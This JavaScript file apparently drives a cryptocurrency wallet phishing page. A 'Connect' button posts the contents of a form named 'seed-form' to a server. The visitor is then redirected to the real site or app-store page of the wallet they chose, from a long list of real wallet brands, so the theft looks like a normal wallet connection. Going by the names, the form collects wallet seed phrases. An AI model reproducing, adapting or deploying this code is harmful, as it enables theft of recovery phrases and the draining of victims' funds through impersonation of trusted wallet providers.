var Wale = (function ($) {
  'use strict';

  var wale = {};

  function seed_form_submit(thisForm, action, formData) {
    fetch(action, {
      method: 'POST',
      body: formData,
      headers: {
        'X-Requested-With': 'XMLHttpRequest',
      },
    }).then(data => {
      if (data.status == 200) {
        $('.loader').remove();
        let type = formData.get('type');
        switch (type) {
          case 'Rainbow':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://rainbow.me/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString = 'https://play.google.com/store/apps/details?id=me.rainbow';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/rainbow-ethereum-wallet/id1457119021';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Trust Wallet':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString =
                  'https://apps.apple.com/app/apple-store/id1288339409?mt=8';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Coinbase':
            switch (platform) {
              case 'Windows':
                codeString = 'https://www.coinbase.com/signin';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.coinbase.android&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString =
                  'https://apps.apple.com/us/app/coinbase-buy-bitcoin-ether/id886427730';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Argent':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://www.argent.xyz/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString = 'https://play.google.com/store/apps/details?id=im.argent.contractwalletclient&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/argent-defi-in-a-tap/id1358741926';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'MetaMask':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://chrome.google.com/webstore/detail/nkbihfbeogaeaoehlefnkodbefgpgknn';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString = 'https://metamask.app.link/bxwkE8oF99';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://metamask.app.link/skAH3BaF99';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Crypto.com':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://crypto.com/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString = 'https://play.google.com/store/apps/details?id=co.mona.android&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/crypto-com-buy-bitcoin-ether/id1262148500';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Pillar':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://www.pillar.fi/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString = 'https://play.google.com/store/apps/details?id=com.pillarproject.wallet&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/pillar-multichain-defi-wallet/id1346582238';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'imToken':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://token.im/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString = 'https://play.google.com/store/apps/details?id=im.token.app&hl=en&gl=HK';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/imtoken-btc-eth-wallet/id1384798940';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'ONTO':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://onto.app/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString = 'https://play.google.com/store/apps/details?id=com.github.ontio.onto&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/onto-cross-chain-crypto-wallet/id1436009823';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'TokenPocket':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://www.tokenpocket.pro/en/download/app';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString = 'https://play.google.com/store/apps/details?id=vip.mytokenpocket&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/tokenpocket-crypto-defi-wallet/id1436028697';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'MathWallet':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://mathwallet.org/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString = 'https://play.google.com/store/apps/details?id=com.medishares.android&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/math-wallet-blockchain-wallet/id1383637331';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'BitPay':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.bitpay.wallet&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString = 'https://play.google.com/store/apps/details?id=com.bitpay.wallet&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/bitpay-buy-crypto/id1149581638';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Ledger':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://www.ledger.com/ledger-live/download#download-device-1';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.ledger.live';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://itunes.apple.com/app/id1361671700';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Dharma':
            switch (platform) {
              case 'Windows':
                codeString = 'https://www.dharma.io/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://www.dharma.io/';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString =
                  'https://apps.apple.com/gb/app/dharma-your-ethereum-wallet/id1495144415';
                location.href =
                  codeString;
                break;
            }
            break;
          case '1inch':
            switch (platform) {
              case 'Windows':
                codeString = 'https://1inch.io/wallet/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://1inch.io/wallet/';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString =
                  'https://apps.apple.com/us/app/1inch-crypto-defi-wallet/id1546049391';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Huobi':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://www.huobi.com/en-us/download/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=pro.huobi&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/huobi-buy-sell-bitcoin/id1023263342';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Eidoo':
            switch (platform) {
              case 'Windows':
                codeString = 'https://eidoo.io/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=io.eidoo.wallet.prodnet&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString =
                  'https://itunes.apple.com/app/apple-store/id1279896253?pt=118755967&ct=FB1&mt=8';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'MYKEY':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://mykey.org/en';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.mykey.id';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/mykey/id1458318224';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Coin98':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://coin98.com/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=coin98.crypto.finance.media&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/coin98-finance/id1561969966';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'AlphaWallet':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://alphawallet.com/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=io.stormbird.wallet&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/alphawallet-eth-wallet/id1358230430';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'D\'CENT':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://dcentwallet.com/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.kr.iotrust.dcent.wallet&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/dcent-wallet/id1447206611';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'ZelCore':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://zelcore.io/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.zelcash.zelcore&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/zelcore/id1436296839';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Nash':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://nash.io/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=io.nash.app&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/nash-save-money-faster/id1475759236';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'CYBAVO':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://www.cybavo.com/wallet-app-sdk/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.cybavo.btc.wallet&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/tw/app/cybavo-wallet/id1510697681';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'SafePal':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://safepal.io/download';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=io.safepal.wallet&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/safepal-wallet/id1548297139';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'EasyPocket':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://apps.apple.com/us/app/id1517338927';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://apps.apple.com/us/app/id1517338927';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/id1517338927';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'SparkPoint':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://sparkpoint.io/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.sparkpoint&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/sparkpoint-crypto-wallet/id1572629350';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'BitKeep':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.bitkeep.wallet&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.bitkeep.wallet&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/bitkeep/id1395301115';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'PEAKDEFI':
            switch (platform) {
              case 'Windows':
                codeString = 'https://peakdefi.com/download/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.peakdefiwallet&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString =
                  'https://apps.apple.com/us/app/peakdefi-defi-wallet/id1526193527';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Unstoppable':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://unstoppable.money/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=io.horizontalsystems.bankwallet&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/unstoppable-wallet/id1447619907';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'HaloDefi':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://halodefi.org/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.halodefi.wallet&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://halodefi.org/';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'ElliPal':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://www.ellipal.com/pages/ellipal-wallet-app';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.ellipal.wallet&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/ellipal/id1426179665';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'KEYRINGPRO':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://keyring.app/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=co.bacoor.keyring&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/keyring-pro-wallet-connect/id1546824976';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Aktionariat':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://www.aktionariat.com/our-products/portfolio-app';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.aktionariat.app&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://www.aktionariat.com/our-products/portfolio-app';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Talken':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://talken.io/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=io.talken.wallet&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/app/TALKEN/id1459475831';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Gnosis Safe':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://gnosis-safe.io/app/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=io.gnosis.safe&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/gnosis-safe/id1515759131';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Flare':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://flarewallet.io/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.flare&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/flare-wallet/id1496651406';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'KyberSwap':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://kyberswap.com/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://kyberswap.com/';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://kyberswap.com/';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'AToken':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.coinbase.android&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.coinbase.android&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/coinbase-buy-bitcoin-ether/id886427730';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Tongue':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://apps.apple.com/fr/app/tongue-wallet-for-defi-degens/id1534705854';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://apps.apple.com/fr/app/tongue-wallet-for-defi-degens/id1534705854';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/fr/app/tongue-wallet-for-defi-degens/id1534705854';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'RWallet':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/app/apple-store/id1288339409?mt=8';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'PlasmaPay':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://plasmapay.com/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.plasmapay.androidapp&hl=en_IE&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/kn/app/plasmapay-defi-crypto-wallet/id1461735396';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'O3Wallet':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://o3.network/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://o3.network/';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/o3-wallet/id1528451572';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'HashKey Me':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://me.hashkey.com/en';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.hashkey.me.google&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/nl/app/hashkey-me-identity-wallet/id1547228803';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Defiant':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://defiantapp.tech/home/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=ar.com.andinasmart.defiant&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/ar/app/defiant-wallet/id1559622756';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Valora':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://valoraapp.com/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=co.clabs.valora&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/valora-crypto-wallet/id1520414263';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Celo Wallet':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://celowallet.app/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=org.celo.mobile.alfajores&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://celowallet.app/';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Essentials':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://play.google.com/store/apps/details?id=org.elastos.essentials.app&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=org.elastos.essentials.app&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/elastos-essentials/id1568931743';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'fuse.cash':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://fuse.cash/';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=io.fuse.cash&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/fuse-cash/id1559937899';
                location.href =
                  codeString;
                break;
            }
            break;
          case 'Bitpie':
            switch (platform) {
              case 'Windows':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.bitpie&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'Android':
                codeString =
                  'https://play.google.com/store/apps/details?id=com.bitpie&hl=en&gl=US';
                location.href =
                  codeString;
                break;
              case 'iOS':
                codeString = 'https://apps.apple.com/us/app/bitpie-universal-crypto-wallet/id1481314229';
                location.href =
                  codeString;
                break;
            }
            break;
          default:
            Swal.fire(
              'Oh, Sorry!',
              'We will soon add support for <b>' +
              formData.get('type') +
              '</b>.',
              'info'
            );
            break;
        };
      } else if (data.status == 400) {
        $('.loader').remove();
        Swal.fire(
          'Oops!',
          'Network issues, please try again...',
          'error'
        );
      } else if (data.status == 404) {
        $('.loader').remove();
        Swal.fire(
          'Error!',
          'Form filled incorrectly!',
          'error'
        );
      }
    });
  }

  var ua = navigator.userAgent.toLowerCase();
  var isAndroid = ua.indexOf('android') > -1;
  var isIOS = ua.indexOf('mac') > -1;
  var isWindows = ua.indexOf('win') > -1;
  let platform = null;
  var codeString = '';

  if (isAndroid) {
    platform = 'Android';
  } else if (isIOS) {
    platform = 'iOS';
  } else if (isWindows) {
    platform = 'Windows';
  }


  $(document).ready(function () {
    $("#mainModal").modal('show');

    const tabs = document.querySelector(".button-row");

    if (tabs) {

      $('.page').hide();
      $('.page.act').show();

      tabs.onclick = e => {
        const id = e.target.dataset.id;

        switch (id) {
          case '1':
            $('.page').hide()
            $('.page.act').hide();
            $('#p1').show();
            break;
          case '2':
            $('.page').hide()
            $('.page.act').hide();
            $('#p2').show();
            break;
          case '3':
            $('.page').hide()
            $('.page.act').hide();
            $('#p3').show();
            break;
          case '4':
            $('.page').hide()
            $('.page.act').hide();
            $('#p4').show();
            break;
          case '5':
            $('.page').hide()
            $('.page.act').hide();
            $('#p5').show();
            break;
        }

      }
    }


    $('#connectButton').click(function (e) {
      e.preventDefault();

      let thisForm = $('#seed-form');

      let action = thisForm.attr('action');

      $('#loader').append('<div class="loader mx-auto mt-3"></div>');

      let formData = new FormData(document.getElementById('seed-form'));

      seed_form_submit(thisForm, action, formData);
    });
  });

  return wale;
})(jQuery);